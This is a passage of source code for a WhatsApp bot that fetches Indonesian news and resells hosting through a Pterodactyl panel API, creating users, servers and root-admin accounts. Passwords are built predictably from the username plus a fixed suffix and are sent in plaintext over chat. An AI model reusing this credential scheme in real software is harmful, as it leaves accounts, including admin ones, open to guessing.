  try {
IndozoneNews().then(async(res) => {
no = 0
iwannnnnn = ""
for (let i of res) {
no += 1
iwannnnnn += `\n• ${no.toString()} •\n`
iwannnnnn += `Berita: ${i.berita}\n`
iwannnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnn += ""
Dare.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('An error occurred while retrieving news.');
        });
    } catch (err) {
        console.error(err);
        reply('An unexpected error occurred.');
    }
}
break
//=================================================//
case 'kompas': {
  try {
KompasNews().then(async(res) => {
no = 0
iwannnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnn += `Berita: ${i.berita}\n`
iwannnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnn += ""
Dare.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('An error occurred while retrieving news.');
        });
    } catch (err) {
        console.error(err);
        reply('An unexpected error occurred.');
    }
}
break
//=================================================//
case 'detiknews': {
  try {
DetikNews().then(async(res) => {
no = 0
iwannnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnn += ""
Dare.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('An error occurred while retrieving news.');
        });
    } catch (err) {
        console.error(err);
        reply('An unexpected error occurred.');
    }
}
break
//=================================================//
case 'dailynews': {
DailyNews().then(async(res) => {
no = 0
iwannnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnn += ""
Dare.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnn }, { quoted:m })
})
}
break
//=================================================//
case 'inews': {
iNews().then(async(res) => {
no = 0
iwannnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnn += ""
reply(iwannnnnnnnnn) 
})
}
break
//=================================================//
case 'okezone': {
  try {
OkezoneNews().then(async(res) => {
no = 0
iwannnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
Dare.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('An error occurred while retrieving news.');
        });
    } catch (err) {
        console.error(err);
        reply('An unexpected error occurred.');
    }
}
break
//=================================================//
case 'sindo':{
SindoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnn += ""
reply(iwannnnnnnnnnnn) 
})
}
break
//=================================================//
case 'tempo': {
  try {
TempoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
Dare.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('An error occurred while retrieving news.');
        });
    } catch (err) {
        console.error(err);
        reply('An unexpected error occurred.');
    }
}
break
//=================================================//
case 'antara':{
  try {
AntaraNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
Dare.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('An error occurred while retrieving news.');
        });
    } catch (err) {
        console.error(err);
        reply('An unexpected error occurred.');
    }
}
break
//=================================================//
case 'kontan':{
  try {
KontanNews().then(async (res) => {
iwannnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnn += ""
Dare.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('An error occurred while retrieving news.');
        });
    } catch (err) {
        console.error(err);
        reply('An unexpected error occurred.');
    }
}
break
//=================================================//
case 'merdeka': {
  try {
MerdekaNews().then(async (res) => {
iwannnnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnnn += ""
const thumb = res[0].berita_thumb || '';
Dare.sendMessage(m.chat, { image : { url : thumb }, caption: iwannnnnnnnnnnnnnnn }, { quoted:m })
   }).catch(err => {
            console.error(err);
            reply('An error occurred while retrieving news.');
        });
    } catch (err) {
        console.error(err);
        reply('An unexpected error occurred.');
    }
}
break
//=================================================//
case 'jalantikus': {
var reis = await JalanTikusMeme()
tekcs = ""
tekcs += "Jalan Tikus Meme\n\n"
tekcs += `Source: ${reis}`
tekcs += ""
Dare.sendMessage(m.chat, { image : { url : reis }, caption: tekcs }, { quoted:m })
}
break
//=================================================//
//==================================================================
case 'listusr': {
  if (!DareTheCreator) return reply(mess.only.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Dare.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Use commands ${prefix}listusr ${res.meta.pagination.current_page + 1} to see the next page.`);
  }
}
break;
        case 'delsrv': {
      if (!DareTheCreator) return reply(`Special ${global.botname} Aja`)

let srv = args[0]
if (!srv) return reply('Where Is his ID?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case 'delusr': {
  if (!DareTheCreator) return reply(`Special ${global.botname} Aja`)
let usr = args[0]
if (!usr) return reply('Where Is his ID?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                
case 'listsrv': {
  if (!DareTheCreator) return reply(`Sorry, you can't see the server list.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Dare.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Use commands ${prefix}listsrv ${res.meta.pagination.current_page + 1} to see the next page.`);
  }
}
break;

case 'tutorial': {
const owned = `6285745522549@s.whatsapp.net`
const text12 = nanoliatwaktu + ` *@${sender.split("@")[0]}*

▭▬▭( *TUTOR RUN* )▭▬▭

*TUTOR RUN BOT*
( https://youtu.be/rqqxkI4P8YY )

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Dare.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break

case 'ramlist': {
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = nanoliatwaktu + ` *@${sender.split("@")[0]}*

▭▬▭▬▭( *SERVER V1* )▭▬▭▬▭

.1gb [username,nomor]
.2gb [username,nomor]
.3gb [username,nomor]
.4gb [username,nomor]
.5gb [username,nomor]
.6gb [username,nomor]
.7gb [username,nomor]
.8gb [username,nomor]
.unli [username,nomor]

Example:
.ram username,nomor
.1gb Nano,6285745522549
▬▭▬▭▬▭▬▭▬▭▬▭▬

▭▬▭▬▭( *SERVER V2* )▭▬▭▬▭

.srv21gb [username,nomor]
.srv22gb [username,nomor]
.srv23gb [username,nomor]
.srv24gb [username,nomor]
.srv25gb [username,nomor]
.srv26gb [username,nomor]
.srv27gb [username,nomor]
.srv2unli [username,nomor]

Example:
.srv2(RAM PANEL) username,nomor
.srv21gb Nano,6285745522549
▬▭▬▭▬▭▬▭▬▭▬▭▬`;

    Dare.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m });

    // Use the audio URL directly
    const audioUrl = 'https://files.catbox.moe/4u9t1x.mp3'; // Replace with the actual URL

    Dare.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
    break;
}

case 'premlist':{
if (!DareTheCreator) return reply(mess.owner)
let listprem =`*LIST SELER ${global.botname}*\n\nTotal Seller : ${owner.length}\n`
var no = 1
for (let x of owner) {
listprem +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listprem +=`Untuk Menghapus Akses Prem Ketik ${prefix}delprem 628xxx/@tag`
Dare.sendMessage(m.chat, {text: listprem },{quoted: Dare.chat})
}
break
case 'addsrv': {
if (!DareTheCreator) return reply(`What are you doing ? This Feature is Special for My Master😜`)
let s = text.split(',');
if (s.length < 7) return reply(`*Incorrect format!*

Use:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
// = data.attributes.pStartup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "BUYER ＤＡＲＥ－Ｖ3 || THE PANEL IS USED, SIR",
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "/usr/local/bin/${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start",
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
case 'suspend': {
            if (!DareTheCreator) return reply(`Special ${global.botname} Ajah`)
            let srv = args[0]
            if (!srv) return reply('Where Is his ID?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
            reply('*BERHASIL SUSPEND..*')
        }
            break
            case 'unsuspend': {
            if (!DareTheCreator) return reply(`Special ${global.botname} Ajah`)
            let srv = args[0]
            if (!srv) return reply('Where Is his ID?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case 'createadmin': {
if (!DareTheCreator) return reply(mess.only.owner)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/number\n\nExample :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/number\n\nExample :\n${prefix+command} example,@user`)
let password = username + "46093"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
🙂USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🙂LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await Dare.sendMessage(m.chat, listMessage)

    await Dare.sendMessage(nomornya, {

        text: `*HERE ARE THE DETAILS OF YOUR ADMIN PANEL ACCOUNT*\n
USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}


*NOTE : OWNER ONLY SENDS 1X DATA PLEASE SAVE YOUR ACCOUNT CAREFULLY PLEASE SAVE YOUR ACCOUNT CAREFULLY CANNOT SEND YOUR ACCOUNT ANYMORE*


`,

    })

}
break
                case 'createadmin2': {
if (!DareTheCreator) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/number\n\nExample :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/number\n\nExample :\n${prefix+command} example,@user`)
let password = username + "46093"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Admin",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: Admin

📡ID: ${user.id}
🌷UUID: ${user.uuid}
🙂USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🙂LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

`
    const listMessage = {

        text: tks,

    }

	

    await Dare.sendMessage(m.chat, listMessage)

    await Dare.sendMessage(nomornya, {

        text: `*HERE ARE THE DETAILS OF YOUR ADMIN PANEL ACCOUNT*\n
USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain2}


*NOTE: OWNER ONLY SENDS YOUR ACCOUNT DATA 1X PLEASE SAVE IT CAREFULLY IF YOUR ACCOUNT DATA IS LOST THE OWNER CANNOT SEND YOUR ACCOUNT AGAIN*


`,

    })

} 
        break
        case 'listadmin': {
  if (!DareTheCreator) return reply(`Sorry, you can't see the user list.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "The following is a list of admins:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await Dare.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Use commands ${prefix}listusr ${res.meta.pagination.current_page + 1} to see the next page.`);
  }
}
break;
case '1gb': {
if (!isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "1050"
let cpu = "30"
let disk = "1050"
let email = username + "1398@gmail.com"
try {
if (!u) return
let d = (await Dare.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `𝙎𝘼𝙇𝘼𝙈 🥇 @${u.split`@`[0]}

⎙─➤ *🙂USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER ONLY SENDS 1X DATA 
PLEASE SAVE YOUR ACCOUNT CAREFULLY
IF YOUR ACCOUNT DATA IS LOST OWNER
CANNOT SEND YOUR ACCOUNT ANYMORE
=====================================
`
Dare.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('Yes, it failed, uncle...\n_please check your hydroelectric and pltc fires_')
}

}

break
case '2gb': {
if (!isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "2070"
let cpu = "60"
let disk = "2070"
let email = username + "1398@gmail.com"
try {
if (!u) return
let d = (await Dare.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `𝙎𝘼𝙇𝘼𝙈 🥇 @${u.split`@`[0]}

⎙─➤ *🙂USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER ONLY SENDS 1X DATA 
PLEASE SAVE YOUR ACCOUNT CAREFULLY
IF YOUR ACCOUNT DATA IS LOST OWNER
CANNOT SEND YOUR ACCOUNT ANYMORE
=====================================
`
Dare.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yeah, failed sɪʀ...\n_Please check your hydroelectric and pltc fires_')
}
}

break
case '3gb': {
if (!isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "3090"
let cpu = "90"
let disk = "3090"
let email = username + "1398@gmail.com"
try {
if (!u) return
let d = (await Dare.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `𝙎𝘼𝙇𝘼𝙈 🥇 @${u.split`@`[0]}

⎙─➤ *🙂USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER ONLY SENDS 1X DATA 
PLEASE SAVE YOUR ACCOUNT CAREFULLY
PLEASE SAVE YOUR ACCOUNT CAREFULLY
CANNOT SEND YOUR ACCOUNT ANYMORE
=====================================
`
Dare.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
